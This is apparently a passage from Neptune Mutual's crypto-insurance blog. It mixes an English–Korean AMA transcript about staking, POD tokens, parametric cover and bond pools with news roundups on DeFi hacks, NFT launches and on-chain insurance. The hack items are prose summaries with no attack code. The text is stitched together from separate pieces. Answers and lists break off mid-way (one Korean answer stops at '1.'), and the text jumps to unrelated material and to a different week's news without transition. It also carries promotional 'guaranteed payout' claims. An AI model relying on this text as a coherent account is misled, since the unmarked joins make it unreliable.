(@tkwn#7090)</strong></strong></p><p><strong><strong>Gillian: </strong></strong>There will only be one stablecoin supported in one blockchain. However, we do not have any plans to cover stablecoin de-peg risks.</p><p><strong><strong>Q5. Is there a different currency formation other than npm coin currency? (@Maykanat#7773)</strong></strong></p><p><strong><strong>Edward: </strong></strong>The cover pools are denominated in stablecoins. The NPM tokens are required for governance. We have not yet deployed the NPM tokens. Please be aware of scammers.</p><p><strong><strong>Q6. Does neptune mutual insurance protection apply to general coins? (@Maykanat#7773)</strong></strong></p><p><strong><strong>Gillian: </strong></strong>Cover pools will be set up by cover creators to cover a variety of different security risks for CeFi, DeFi and Metaverse projects. It is obviously really important to read through the specific parameters of any cover pool for which you might be interested either in taking out cover protection, or providing liquidity as a liquidity provider.</p><p><strong><strong>Q7. Have mainnet stake pools been announced?</strong></strong></p><p><strong><strong>Binod</strong></strong>: We have released a partnership announcement with XT.com and we are working with quite a number of DeFi and CeFi projects at the moment so that we have a range of cover pools available when we launch on mainnet. Do please follow our Twitter, Medium and other channels as we’ll be releasing partnership news over the coming weeks. Remember also to follow us on YouTube :)</p><p><strong><strong>Part 4: Closing the session</strong></strong></p><p>That ends our AMA session for today. This has been a productive and meaningful session and we hope that our founders were able to give light to some of your concerns and confusions. We wish that we could answer all of your questions now, but we will save them for next time. You heard that right, this is only the first of many more AMA sessions to come. So sit back, hold on to your seats because we will be back with more exciting news for you on our next AMA sessions. Again, we would like to thank everyone for joining us today. For those who missed it, we will save the transcript in our AMA archived channel for them to read later on.</p><p><strong><strong>Gillian: </strong></strong>thanks everybody for bearing with us hope you learned something new about Neptune Mutual.</p><p><strong><strong>Binod: </strong></strong>Thank you all for joining us today. We would love to answer more of your questions. Please do not hesitate to ask them and we will pick each of them up for the next round.</p><p><strong><strong>Edward: </strong></strong>Thanks for all your great questions everyone. Has been a pleasure sharing our plans with you. Thanks so much for your support … we really appreciate it.</p><hr><h3 id="about-us">About Us</h3><p>Neptune Mutual project safeguards the Ethereum community from cyber threats.

Investors and other participants in the metaverse, like in the real world, are putting money into land and space in the hopes of seeing a return. Through immersive 3D experiences, 3D ads can help create a more cohesive brand story as a narrative medium. NFTs make it easy for people to get paid for their creative work, such as advertisements and commercial placements. As a result of this, we can expect to see the adoption of new media types, such as 3D photos, virtual product placements, and wearables.</p><h2 id="blockchain-hacks">Blockchain Hacks</h2><p>1Hive Bees’ Honeyswap, a multichain DEX and liquidity aggregator, was the victim of a front-end attack The alleged hacker took over the domain, resulting in a front-end issue that caused the transaction to be routed to a fraudulent address. According to a Tweet, the organisation has reclaimed its original domain name and has put together a Governance proposal to reimburse the lost funds caused by this unfortunate event, with the assets valued at less than $20,000.</p><p>There was a flash loan attack on the project Feed Every Gorilla that resulted in the loss of $1.3 million in assets on both the Ethereum and BNB Chains. In total, the attacker deposited 116 BNB and borrowed 915 WBNB from the fBNB. The malicious actor was then able to increase and approve their balance multiple times by repeatedly calling multiple methods in the flash loan contracts. Using 10 addresses that the attacker had control over, the attacker was able to drain all of the fBNB that was in the contract.</p><p>A rug pull occurred on the project Burgers Network, reducing the token value by 90%. Approximately $167,000 was stolen during the heist, which included 530 BNB and 7K BSC-USD tokens. 999,999,999,999 Burgers Network tokens were initially sent to a malicious test address. Later, 300,000,000,000 Burgers Network tokens were transferred to the rug puller’s address, resulting in a profit of approximately $167K by selling the tokens on Pancake Swap.</p><h2 id="metaverse-and-nfts">Metaverse, and NFTs</h2><p>Mark Zuckerberg, CEO of Meta, announced that the business will begin testing digital collectibles on Instagram, marking a move toward integrating NFTs into the photo and video sharing platform. Instagram’s test of digital treasures is the first step toward allowing creators and collectors to exhibit their NFTs on other Meta-controlled platforms, including WhatsApp, Facebook Messenger, and Facebook. Instagram users may now be able to use NFTs as their profile pictures. Meta is also working on augmented reality NFTs for Instagram and plans to introduce similar features to Facebook in the near future.</p><p>Lina Valentina, a well-known feminist artist, is preparing to launch her first NFT series, titled ‘No More,’ which will include 7,777 unique NFTs depicting a female face. Lina Valentina uses painting and other art forms to encourage women to speak out against domestic violence. She also incorporates elements from Salvador Dal and her favorite music into her work, resulting in some intriguing artwork capable of sparking a meaningful conversation. The NFT collection, dubbed ‘No More,’ follows in the footsteps of her paintings and other works of art. The collection is expected to strengthen women’s position in the Web 3.0 environment, and also sets a tone as a tribute to women who have experienced domestic violence in an attempt to condemn all of them. Furthermore, the collection will provide courage and hope to women who are subjected to this abuse but remain silent about it.</p><p>Mr. Bean’s official Twitter account announced the launch of his first Ethereum-based NFT collection. To introduce Mr. Bean’s distinctive persona to the Metaverse, global content producer Banijay and popular NFT platform Fomo Lab have joined forces with the beloved figure. However, no specific release date has been announced yet. 3333 Mr. Bean collectibles representing the main character and various characters from the cartoon series are available for purchase. Toys like Teddy the teddy bear and Scrapper the cat and Mrs. Wicket, among others, are already in his collection as NFTs, but more are on the way.</p><p>‘Mother of Creation,’ a three-part NFT triptych by Madonna and Beeple, has been released on SuperRare with a list price of 0.00035774 ETH ($1). Both artists hope to establish a link between the concepts of creativity and parenting in our current world through a trilogy of video non-fiction shorts (NFTs). Naked 3D Madonna avatars in various backdrops are featured in all three video NFTs, which are all NSFW in nature. Despite the raunchy content, these NFTs convey an important message: Never give up hope, because you never know where life may take you next.</p><p>Several organizations, including NASA, are considering making the move to the metaverse. It’s been announced that NASA and Epic Games are competing to create a martian metaverse simulation. As part of NASA’s research into extravehicular activities on the surface of Mars, developers were tasked with creating virtual reality assets and scenarios that could be used by NASA in order to increase the chances of the United States landing on Mars by 2040. Those who participate in the NASA Mars XR metaverse challenge will have access to this incredible virtual world, including assets such as rovers, suits, and other equipment.</p><h2 id="onchain-insurance-industry-news">OnChain Insurance Industry News</h2><p>A Babylon smart contract insurance policy has been developed in conjunction with Babylon Finance and Nexus Mutual. Besides oracle errors, the policy will also cover Babylon Finance contract problems and governance breaches.

We appreciate all of your assistance. In case you missed it, here’s a recap of the entire session:</p><h2 id="part-1-introduction">Part 1. Introduction</h2><h3 id="q1-please-introduce-the-project">Q1. Please introduce the project :)</h3><p><strong><strong>A1:</strong></strong> It is really our honor to conduct our very first AMA session with the ICO Pantera Community, we truly appreciated the warmth and diligent support ICO Pantera team has provided to us for the past few months.</p><p>Neptune Mutual is a P2P marketplace for parametric cover pools, as long as trigger events are validated, the cover purchasers are entitled to guaranteed payout without having to undergo individual claim assessments or authentication of loss proofs. Our early supporters include Fenbushi, Coinbase, Huobi, OKX, Animoca, GBV, GSR, ICO Pantera, and many more.</p><p>Neptune Mutual aims to provide cover solutions for Cefi, Defi, and Metaverse projects and has already reached agreements with a number of partners with announcements in the pipeline.</p><h3 id="%ED%94%84%EB%A1%9C%EC%A0%9D%ED%8A%B8%EC%97%90-%EB%8C%80%ED%95%9C-%EC%84%A4%EB%AA%85-%EB%B6%80%ED%83%81%EB%93%9C%EB%A6%BD%EB%8B%88%EB%8B%A4">프로젝트에 대한 설명 부탁드립니다 :)</h3><p>ICO Pantera Community와 함께 첫 AMA 세션을 진행하게 되어 기쁘게 생각합니다. 지난 몇 달 동안 ICO Pantera 팀이 저희에게 제공한 따뜻하고 성실한 지원에 진심으로 감사드립니다.</p><p>넵튠 뮤추얼은 파라메트릭 커버 풀을 위한 P2P 시장입니다. 트리거 이벤트가 검증되면 커버 구매자는 개별 클레임 평가나 손실 증명 인증을 받지 않고도 지급 보장을 받을 수 있습니다. 초기 지원 업체로는 Fenbushi, Coinbase, Huobi, OKX, Animoca, GBV, GSR, ICO Pantera 등이 있습니다.</p><p>넵튠 뮤추얼은 Cefi, Defi 및 Metaverse 프로젝트를 위한 커버 솔루션을 제공하는 것을 목표로 하고 있으며, 이미 파이프라인에서 발표와 함께 여러 파트너와 합의에 도달했습니다.</p><h2 id="part-2-questions-from-ico-pantera-host">Part 2. Questions from ICO Pantera Host</h2><h3 id="q1-neptune-mutual-team-recently-released-staking-and-pod-staking-functions-and-i-wonder-what-the-difference-between-the-two-is-and-what-is-different-from-the-existing-coin-staking-parkgwangeun">Q1. Neptune Mutual team recently released Staking and POD Staking functions, and I wonder what the difference between the two is and what is different from the existing coin Staking? (@parkgwangeun)</h3><p><strong><strong>A1 (Gillian):</strong></strong> The Staking Pools feature is created to reward the NPM token holder community by offering project native tokens as a staking reward. In the staking pools, users can stake their NPM tokens to receive many different ERC-20 tokens.</p><p>In the POD Staking Pools, users can stake their POD. As a reminder, PODs are the proof of deposit tokens that users get when they invest stablecoin liquidity into a project’s dedicated cover pool. Users are rewarded for staking their PODs with the project’s native token.</p><p>The difference between Staking and POD Staking Pools is that on the Staking Pools, you deposit NPM to receive rewards whereas in the POD Staking Pools, you deposit PODs. Aside from this difference, both features have exactly the same functionality.</p><h3 id="neptune-mutual%ED%8C%80%EC%9D%80-%EC%B5%9C%EA%B7%BC%EC%97%90-staking-%EA%B3%BC-pod-staking-%EA%B8%B0%EB%8A%A5%EC%9D%84-%EC%B6%9C%EC%8B%9C%ED%95%98%EC%98%80%EB%8A%94%EB%8D%B0-%EB%91%98%EC%9D%98-%EC%B0%A8%EC%9D%B4%EC%A0%90%EC%9D%80-%EB%AC%B4%EC%97%87%EC%9D%B8%EC%A7%80-%EA%B6%81%EA%B8%88%ED%95%98%EA%B3%A0-%EA%B8%B0%EC%A1%B4-%EC%BD%94%EC%9D%B8-staking-%EA%B3%BC-%EB%8B%A4%EB%A5%B8-%EC%A0%90%EC%9D%B4-%EC%9E%88%EB%8B%A4%EB%A9%B4-%EB%AC%B4%EC%97%87%EC%9D%B4-%EC%9E%88%EB%8A%94%EC%A7%80-%EA%B6%81%EA%B8%88%ED%95%A9%EB%8B%88%EB%8B%A4">Neptune Mutual팀은 최근에 staking 과 POD Staking 기능을 출시하였는데 둘의 차이점은 무엇인지 궁금하고 기존 코인 staking 과 다른 점이 있다면 무엇이 있는지 궁금합니다.</h3><p>Staking Pools 기능은 프로젝트 네이티브 토큰을 스테이킹 보상으로 제공하여 NPM 토큰 홀더 커뮤니티에 보상하기 위해 만들어졌습니다. 스테이킹 풀에서 사용자는 NPM 토큰을 사용하여 다양한 ERC-20 토큰을 받을 수 있습니다.</p><p>POD 스테이킹 풀에서 사용자는 자신의 POD를 걸 수 있습니다. 참고로, POD는 사용자가 스테이블 코인 유동성을 프로젝트의 전용 커버 풀에 투자할 때 받는 예금 토큰의 증거물 같은 것입니다. 사용자는 프로젝트의 기본 토큰과 함께 자신의 POD를 스테이킹한 것에 대해 보상을 받습니다.</p><p>Staking Pool과 POD Staking Pool의 차이점은 Staking Pool에서는 보상을 받기 위해 NPM을 입금하는 반면 POD Staking Pool에서는 POD를 입금한다는 것입니다. 이러한 차이를 제외하고 두 기능은 완전히 동일합니다.</p><h3 id="q2-by-investing-in-neptune-mutual%E2%80%99s-stablecoin-can-we-guarantee-the-security-of-our-main-investment-as-a-service-parkgwangeun">Q2. By investing in Neptune Mutual’s stablecoin, can we guarantee the security of our main investment as a service? (@parkgwangeun)</h3><p><strong><strong>A2 (Binod):</strong></strong> Investing is always subject to risk.</p><p>When investing stablecoin into dedicated cover pools in the Neptune Mutual marketplace, users take on a number of risks, including: the underwriting risk associated with the cover policies, which would need to be paid to policyholders if an incident arises; and smart contract risk. One advantage of these stablecoin cover pools is that there is no risk that token price volatility influences the amount of capital in the pools, the amount paid to liquidity providers, or the amount paid out to policyholders in the event of an incident.</p><p>In terms of smart contract risks, we follow best practices, Security is our top priority. Before our protocol is launched, we will publicly release our audit report(s). We will engage more audit companies to get regular audits done.</p><p>As we have witnessed numerous supply-chain attacks against DeFi apps, smart contract audits alone are not enough. We plan to do more:</p><p><strong><strong>1. Smart Contract Security: </strong></strong>Role-based access control, Well-structured, properly-defined, and fine-tuned ACL usage that conforms to the principle of least privilege, Internal Solidity security guidelines, Adherence to SWC Registry guidelines, Unit Testing &amp; Test Stories (BDD), Source code analyzers: static, dynamic, and subscription-based, Third-party smart contract audit(s)</p><p><strong><strong>2. Application Testing:</strong></strong> Penetration testing, Stress testing</p><p><strong><strong>3. Proper Cyber Hygiene</strong></strong></p><p><strong><strong>4. Supply-chain Security and Monitoring:</strong></strong> Dependency audit, HTTP security, DNS security, Secrets, and access key usage audit, Favoring pull over push when deploying</p><p><strong><strong>5. Bug Bounties</strong></strong></p><h3 id="neptune-mutual%EC%9D%98-%EC%8A%A4%ED%85%8C%EC%9D%B4%EB%B8%94-%EC%BD%94%EC%9D%B8%EC%9D%84-%ED%88%AC%EC%9E%90%ED%95%B4-%EC%A0%80%ED%9D%AC%EA%B0%80-%EC%A3%BC%EB%A1%9C-%EC%9D%B4%EC%9A%A9%ED%95%98%EB%8A%94-%ED%88%AC%EC%9E%90-%EB%82%B4%EC%9A%A9%EC%9D%98-%EB%B3%B4%EC%95%88%EC%9D%84-%EC%84%9C%EB%B9%84%EC%8A%A4%EB%A1%9C-%EB%B3%B4%EC%9E%A5%EB%B0%9B%EC%9D%84-%EC%88%98-%EC%9E%88%EC%8A%B5%EB%8B%88%EA%B9%8C">Neptune Mutual의 스테이블 코인을 투자해 저희가 주로 이용하는 투자 내용의 보안을 서비스로 보장받을 수 있습니까?.</h3><p>투자는 항상 위험에 노출됩니다.</p><p>넵튠 뮤추얼 마켓플레이스의 전용 커버 풀에 스테이블 코인을 투자할 때, 사용자는 커버 정책과 관련된 인수 위험(사고 발생 시 보험 계약자에게 지급해야 하는 위험)과 스마트 계약 위험(Smart Contract Risk)을 포함하여 여러 가지 위험을 감수합니다. 이러한 스테이블 코인 커버 풀의 한 가지 장점은 토큰 가격 변동성이 풀의 자본 금액, 유동성 공급자에게 지급되는 금액 또는 사고 발생 시 보험 계약자에게 지급되는 금액에 영향을 미칠 위험이 없다는 것입니다.</p><p>스마트 계약 위험 측면에서 저희는 모범 사례를 따르고 있으며, 보안이 최우선 과제입니다. 프로토콜이 출시되기 전에 감사 보고서를 공개적으로 공개할 예정입니다. 정기 감사를 실시하기 위해 더 많은 감사 회사를 참여시킬 것입니다.</p><p>DeFi 앱에 대한 수많은 공급망 공격을 목격했듯이 스마트 계약 감사만으로는 충분하지 않습니다. 저희는 더 많은 것을 할 계획입니다.</p><p>1.

What exactly is Neptune Mutual’s insurance policy? Is the project that partners with Neptune Mutual compensates for attacks such as hacking and flashloan? I’d like to know about the compensation amount and how to compensate. (@liberator09)</h3><p><strong><strong>A4 (Edward):</strong></strong> Neptune Mutual’s policies are based on the parametric model. The parametric model enables policyholders to receive guaranteed payout in case of a trigger event. Since each cover will have its own parameters, rules, and exclusions, policyholders must properly check all the details before buying a cover.</p><p>The party that compensates for risks such as hacks (or as written in the cover parameters) is known as the underwriter or Liquidity Provider. The LPs pool risks together based on their belief that a project is secure. A cover project can demonstrate their support to the LPs by offering to become the initial LP and risking their own fund for their own project. In addition to this, cover projects can offer token rewards to incentivize more liquidity providers to join them.</p><p>As a user, you can choose your final payout amount in advance, when purchasing a policy. The payouts given to the policyholders are not based on our or anyone’s discretion. Neptune Mutual does not discriminate against policyholders coming to file their claims. The protocol either provides payouts to everyone in case of trigger event resolution, or no one in case of false reporting.</p><h3 id="neptune-mutual%EC%9D%98-%EB%B3%B4%ED%97%98-%EC%A0%95%EC%B1%85%EC%9D%80-%EC%A0%95%ED%99%95%ED%9E%88-%EC%96%B4%EB%96%A4-%EA%B2%83%EC%9D%B8%EA%B0%80%EC%9A%94-neptune-mutual%EA%B3%BC-%ED%8C%8C%ED%8A%B8%EB%84%88%EB%A5%BC-%EB%A7%BA%EC%9D%80-%ED%94%84%EB%A1%9C%EC%A0%9D%ED%8A%B8%EC%97%90%EC%84%9C-%ED%95%B4%ED%82%B9-flash-loan-%EA%B0%99%EC%9D%80-%EA%B3%B5%EA%B2%A9%EC%97%90-%EB%8C%80%ED%95%9C-%EB%B3%B4%EC%83%81%EC%9D%84-%ED%95%B4%EC%A3%BC%EB%8A%94-%EA%B2%83%EC%9D%B8%EA%B0%80%EC%9A%94-%EB%B3%B4%EC%83%81-%EA%B8%88%EC%95%A1%EA%B3%BC-%EB%B3%B4%EC%83%81-%EB%B0%A9%EC%95%88%EC%97%90-%EB%8C%80%ED%95%B4%EC%84%9C-%EC%95%8C%EA%B3%A0-%EC%8B%B6%EC%8A%B5%EB%8B%88%EB%8B%A4">Neptune Mutual의 보험 정책은 정확히 어떤 것인가요?

I heard that Neptune Mutual’s platform has the ability to counter Market Risks, how does it work? (@asdow1)</h3><p><strong><strong>A8 (Binod):</strong></strong> Neptune Mutual protocol provides a platform for the projects, underwriters, and policyholder communities to minimize risks. Underwriters add stablecoin funds to a cover pool to pool the risks, also known as liquidity providers. Cover projects are themselves initial underwriters to bootstrap liquidity to the pool. Cover projects reward the liquidity provider community by offering incentives, which makes it attractive to the LPs to pool more funds for their cover.</p><p>Policyholders can minimize their market risks by purchasing protection/coverage. If a trigger event or incident happens after the coverage start period and before coverage expiry, the policyholders are entitled to receive payouts. The payouts can be claimed following incidents based on an unbiased, on-chain resolution by NPM governance participants.</p><p>In addition to the above, Neptune Mutual is also building other cover-related products and actively participating in the underwriting of the market risks by assessing projects, identifying potential security risks, and funding qualified cover pools via Bond program.</p><h3 id="neptune-mutual%EC%9D%98-%ED%94%8C%EB%9E%AB%ED%8F%BC%EC%97%90%EB%8A%94-market-risks%EC%97%90-%EB%8C%80%EC%9D%91%ED%95%98%EB%8A%94-%EA%B8%B0%EB%8A%A5%EC%9D%B4-%EC%9E%88%EB%8B%A4%EA%B3%A0-%EB%93%A4%EC%97%88%EB%8A%94%EB%8D%B0-%EC%96%B4%EB%96%A4-%EB%B0%A9%EC%8B%9D%EC%9C%BC%EB%A1%9C-%EC%9E%91%EB%8F%99%ED%95%98%EB%82%98%EC%9A%94">Neptune Mutual의 플랫폼에는 Market Risks에 대응하는 기능이 있다고 들었는데, 어떤 방식으로 작동하나요?</h3><p>넵튠 뮤추얼 프로토콜은 위험을 최소화하기 위해 프로젝트, 보험 계약자 및 보험 계약자 커뮤니티에 플랫폼을 제공합니다. 보험사들은 유동성 공급자로 알려진 위험을 해결하기 위해 스테이블 코인 펀드를 커버 풀에 추가합니다. 커버 프로젝트 자체는 유동성을 풀로 부트스트랩하기 위한 초기 보험사입니다. 커버 프로젝트는 인센티브를 제공함으로써 유동성 제공자 커뮤니티에 보상하며, 이는 LP가 커버에 더 많은 자금을 모으는 것을 매력적으로 만듭니다.</p><p>보험 계약자는 보호/보장을 구입하여 시장 위험을 최소화할 수 있습니다. 보험 가입자는 보험 가입 시작 기간 후 및 보험 가입 만료 전에 트리거 이벤트 또는 사고가 발생할 경우 보험금을 지급받을 수 있습니다.

What are the most important functions of a Neptune Mutual and why? And what are the advantages of the Neptune Mutual compared to other projects? (@Minini00)</h3><p><strong><strong>A9 (Edward): </strong></strong>The most important function for Neptune Mutual is to bring together projects that need to manage platform risks, users that need protection for crypto assets, and investors that are keen to benefit from demand for underwriting. Our marketplace brings these parties together in one platform, so that each party will be better off in playing a role within the P2P insurance ecosystem.</p><p>Parametric cover removes the risk you take with discretionary insurance providers that you are denied your payout claim when you most need it.</p><p>Neptune Mutual cover pools offer guaranteed payout upon incident resolution. Each dedicated cover pool underwrites up to a maximum limit of the total liquidity in the cover pool. In traditional insurance pools, the same dollar is used to underwrite a number of different risks on the basis that these risk events are unlikely to occur at the same time. We will be publishing a Medium article shortly about the use of what is called fractionalised reserve systems. What is important to understand is that the Neptune Mutual marketplace has been designed to minimize risk for all stakeholders, and so being able to provide an absolute guarantee that there will always be sufficient liquidity in the cover pools to meet the underwriting risk seemed to us to be really important to users of the platform.</p><p>Other discretionary cover pools do not have a guaranteed payout feature as they adopt fractionalized reserves. Another key point is that cover pools within Neptune Mutual are denominated in stablecoins, liquidity providers can supply stablecoin and expect to earn stablecoin yield composed of fee income &amp; lending incomes. The reason stablecoins are used is to remove dependency on market beta (price volatility) and achieve long-term sustainability.</p><p>Also no membership is required to participate in Neptune Mutual, everyone is welcome and the liquidity providers’s proof of deposit token is a ERC20 fungible yield-bearing token that can be traded in the secondary market.</p><h3 id="neptune-mutual%EC%9D%98-%EA%B8%B0%EB%8A%A5-%EC%A4%91-%EA%B0%80%EC%9E%A5-%EC%A4%91%EC%9A%94%ED%95%9C-%EA%B8%B0%EB%8A%A5%EC%9D%80-%EB%AC%B4%EC%97%87%EC%9D%B4%EB%A9%B0-%EA%B7%B8-%EC%9D%B4%EC%9C%A0%EB%8A%94-%EB%AC%B4%EC%97%87%EC%9D%B8%EA%B0%80%EC%9A%94-%EA%B7%B8%EB%A6%AC%EA%B3%A0-%ED%83%80-%ED%94%84%EB%A1%9C%EC%A0%9D%ED%8A%B8%EC%99%80-%EB%B9%84%EA%B5%90%ED%95%98%EC%97%AC-neptune-mutual-%EB%A7%8C%EC%9D%98-%EC%9E%A5%EC%A0%90%EC%9D%80-%EB%AC%B4%EC%97%87%EC%9D%B8%EA%B0%80%EC%9A%94">Neptune Mutual의 기능 중 가장 중요한 기능은 무엇이며 그 이유는 무엇인가요? 그리고 타 프로젝트와 비교하여 Neptune Mutual 만의 장점은 무엇인가요?</h3><p>넵튠뮤추얼이 가장 중요한 기능은 플랫폼 리스크 관리가 필요한 프로젝트, 암호화폐 자산에 대한 보호가 필요한 사용자, 인수 수요 수혜에 열을 올리는 투자자 등을 한데 모으는 것입니다. 시장은 이러한 당사자들을 하나의 플랫폼으로 통합하여 각 당사자들이 P2P 보험 생태계 내에서 더 나은 역할을 수행할 수 있도록 지원합니다.</p><p>파라메트릭 보험은 당신이 가장 필요할 때 당신의 지불 청구를 거절당했을 때 당신이 재량 보험 제공자에게 부담하는 위험을 제거합니다.</p><p>넵튠 뮤추얼 커버 풀은 사고 해결 시 지급을 보장합니다. 각 전용 커버 풀은 커버 풀의 총 유동성의 최대 한도까지 보증합니다. 기존 보험 그룹에서는 이러한 위험 사건이 동시에 발생할 가능성이 낮다는 점을 근거로 동일한 달러를 사용하여 여러 가지 다른 위험 요소를 보증합니다.</p><p>저희는 분수화된 예비 시스템이라고 불리는 것의 사용에 대한 중간 기사를 곧 출판할 것입니다. 알아야 할 중요한 것은 Neptune Mutual 시장이 모든 이해 관계자의 위험을 최소화하도록 설계되었다는 것입니다. 따라서 보험 증권 풀에서 인수 위험을 충족할 수 있는 충분한 유동성이 항상 있다는 절대적인 보장을 제공할 수 있다는 것은 플랫폼 사용자에게 매우 중요한 것으로 여겨졌습니다.</p><p>다른 임의 보상 풀은 분할 적립금을 채택하기 때문에 보장된 지급 기능이 없습니다. 넵튠뮤추얼 내 커버풀은 스테이블코인으로 표시돼 유동성 공급자가 스테이블코인을 공급할 수 있고 수수료 수입과 대출 수입으로 구성된 안정적인 코인 수익률을 기대할 수 있다는 점도 핵심 포인트다. 스테이블 코인이 사용되는 이유는 시장 베타(가격 변동성)에 대한 의존성을 제거하고 장기적인 지속 가능성을 달성하기 위함입니다.</p><p>또한 멤버십은 넵튠 뮤추얼에 가입할 필요가 없으며, 누구나 환영하며, 유동성 공급자의 예금 증빙 토큰은 2차 시장에서 거래될 수 있는 ERC20 교환 가능 수익률 토큰입니다</p><h3 id="q10-what-are-the-conditions-required-to-run-the-mutual-bond-pool-function-in-the-npm-protocol-win4lice">Q10. What are the conditions required to run the Mutual Bond Pool function in the NPM protocol? (@win4lice)</h3><p><strong><strong>A10 (Gillian):</strong></strong> The Bond Pool feature is inspired by the idea of Protocol-Owned Liquidity feature conceptualized by OlympusDAO. However, unlike the former, NPM tokens are not infinite and inflationary and therefore we will not have always-ongoing Bond campaigns.</p><p>The Bond Pool function will only be announced in seasons. For each season of Bond Pool availability, there will be a fixed allocation of NPM tokens offered at a discounted price.</p><p>As a user, you may use the Bond Pool functionality to exchange your NPM/DAI pair tokens for discounted NPM tokens after a week of waiting (lockup period). After your lockup period, you can claim your bond to receive discounted NPM tokens instead of the Uniswap v2 LP tokens.</p><p>As a protocol, we use Bond to bootstrap POL (Protocol-Owned Liquidity), increase the liquidity depth of the NPM tokens on DEXes, and raise underwriting risk capital for qualified cover projects.</p><h3 id="npm%ED%94%84%EB%A1%9C%ED%86%A0%EC%BD%9C%EC%97%90%EC%84%9C-mutual-bond-pool-%EA%B8%B0%EB%8A%A5%EC%9D%84-%EC%8B%A4%ED%96%89%ED%95%98%EA%B8%B0-%EC%9C%84%ED%95%B4-%ED%95%84%EC%9A%94%ED%95%9C-%EC%A1%B0%EA%B1%B4%EC%9D%80-%EB%AC%B4%EC%97%87%EC%9D%B8%EA%B0%80%EC%9A%94">NPM프로토콜에서 Mutual Bond Pool 기능을 실행하기 위해 필요한 조건은 무엇인가요?</h3><p>Bond Pool 기능은 Olympus DAO에서 개념화한 프로토콜 소유 유동성 기능 아이디어에서 영감을 받았습니다. 그러나 전자와 달리 NPM 토큰은 무한하거나 인플레이션이 있는 것이 아니기 때문에 저희는 항상 진행되는 본드 캠페인을 하지 않을 것입니다.</p><p>Bond Pool 기능은 시즌에만 발표됩니다. Bond Pool을 이용할 수 있는 각 시즌에는 할인된 가격으로 제공되는 NPM 토큰의 고정 얼로케이션이 있습니다.</p><p>사용자는 1주일(잠금 기간)이 지난 후 Bond Pool 기능을 사용하여 NPM/DAI 페어 토큰을 할인된 NPM 토큰으로 교환할 수 있습니다. 잠금 기간이 지나면 Uniswap v2 LP 토큰 대신 할인된 NPM 토큰을 받을 수 있도록 채권을 청구할 수 있습니다.</p><p>프로토콜로서, 저희는 본드를 사용하여 POL(프로토콜 소유 유동성)을 부트스트랩하고, DEX들에서 NPM 토큰의 유동성 깊이를 증가시키며, 적격 커버 프로젝트에 대한 인수 위험 자본을 조달합니다.</p><p><strong><strong>All the questions we prepared are over.

As of May 1, collectors of NFTs have already sent more than $37 billion in value to NFT marketplaces this year with 491,000 unique transacting addresses, a figure that nearly exceeds the total amount of $40 billion in all of 2021. According to data published by Chainalysis, NFTs have been luring a stew of users from all over the world, with Central and Southern Asia leading the push, followed closely by North America and Western Europe.</p><h2 id="blockchain-hacks">Blockchain Hacks</h2><p>An attack on OpenSea’s main Discord channel resulted in false announcements of a partnership between the company and YouTube. The hacker’s initial message, which was posted on the announcements channel, claimed that OpenSea had collaborated with YouTube to integrate their community into the NFT Space. The scammers used a YouTube NFT art phishing link and began advertising a bogus NFT mint, which drove visitors to the YouTube link, where there was a promotion running offering the first 100 participants a 100 percent discount on tokens. Many reports claim that hackers received 13 NFTs worth approximately $18,000 from five different sources around the time of the attack.</p><p>On their debut, MM Finance, the most popular AMM &amp; DEX on Cronos Chain, suffered a major exploit in the BSC network due to a DNS exploit. After just one day of operation, Meerkat Finance was rug pulled for $13 million BUSD and approximately 73,000 BNB, totaling around $31 million at the time of the event.</p><p>The oracle manipulation at Fortress Protocol leads to a $3 million loss of digital assets. The lack of power verification at Fortress allowed the hacker to commandeer their oracle, thereby withdrawing the stolen cash to Tornado Cash.</p><h2 id="metaverse-and-nfts">Metaverse, and NFTs</h2><p>Kraken has entered the NFT space with the launch of the Kraken NFT marketplace for this type of digital asset. Users will be able to curate NFTs across different blockchain networks using a single interface, and purchases through the marketplace will incur no gas fees. According to an announcement through a blog post, the U.S based cryptocurrency exchange has opened the waitlist for its marketplace, which will allow users to buy and sell NFTs as well as reportedly use tokens as collateral for loans. Furthermore, Kraken’s marketplace will include a rarity score based on the traits and attributes that distinguish each NFT and will reward creators with a portion of each secondary market sale price of their NFTs.</p><p>Chris Brown is the latest celebrity to enter the NFT space. The artist is expected to launch his debut NFT collection, dubbed The Auracles in cooperation with John Dean, founder of LA-based clothing brand Renowned on May 10. The digital collectibles are based on a black superhero called The Auracle, who can time travel and his shape lifting ability. In addition, they also sought the support of BlackNFTART, a nonprofit that makes sure emerging technology showcases Black art. The Auracle will also have in-real-life utility, where a handful of the NFT owners will receive a physical object based on the NFT they have.</p><p>Mercedes-AMG Petronas has teamed up with FTX to create an F1 NFT collection featuring cars driven by team drivers Lewis Hamilton and George Russell. The initiative, which was launched at the inaugural Miami Grand Prix on May 7th and 8th, is expected to bring the thrill of racing to the beach with all-day entertainment and music, including epic headline acts closing out each day. The Mercedes-AMG Petronas x NFTs concept’s initial releases are free-to-claim ‘Ticket Stubs’ NFTs that will be randomly distributed to fans who register for the initiative. The first and second sets of these digital collectibles include 2,500 and 1,000 limited edition Ticket Stubs NFTs, respectively, while the third set includes ten exclusive digital assets that can be purchased through an FTX US NFT marketplace auction.</p><p>Pepsi has announced the release of yet another set of one-of-a-kind curated NFTs featuring female artists. The world-famous beverage company has collaborated with some of the most powerful women in the NFT space to launch this collection at Mary J. Blige’s inaugural Strength of a Woman Festival &amp; Summit in Atlanta beginning May 6th, with the goal of promoting, entertaining, and educating women in the Atlanta area and beyond. This NFT collection employs a Proof of Attendance Protocol, which means that anyone who attends the aforementioned event will be able to obtain this one-of-a-kind NFT collection.</p><p>The Leeds United Football Club has announced an NFT collection, entitled Shirts For Ukraine, with earnings going to Ukraine. The football club joins a long list of well-known individuals and organizations that have established NFTs to aid humanitarian efforts in Ukraine. Each NFT is in the form of a card depicting the front and back of a player’s shirt, alongside that player’s autograph. In addition to the NFT, holders can access physical incentives, including two hospitality tickets for the Leeds against Brighton match, a pitchside tour with the club’s legends, and the option to attend an open training session.</p><h2 id="onchain-insurance-industry-news">OnChain Insurance Industry News</h2><p>Nexus Mutual is set to join the dozens of DAOs that have adopted Bancor’s DAO treasury management solution, executing the single largest DAO treasury deposit on Bancor. The wNXM deposit of over $2.2 million comes as a growing number of top DAOs and token projects, including UMA, Flexa Network, Paraswap, KeeperDAO, Harvest Finance, Request Network, and many more, allocate funds on Bancor.</p><p>InsurAce.io, the leading DeFi insurance protocol has announced a strategic partnership with Planet. Planet is a decentralized financial protocol consisting of various planets, each with its own application, that allows anyone to freely activate their capital. InsurAce.io also announced a new strategic partnership with Moonpot, broadening their existing partnership with Beefy Finance. InsurAce’s multi-chain approach will protect Moonpot users across any 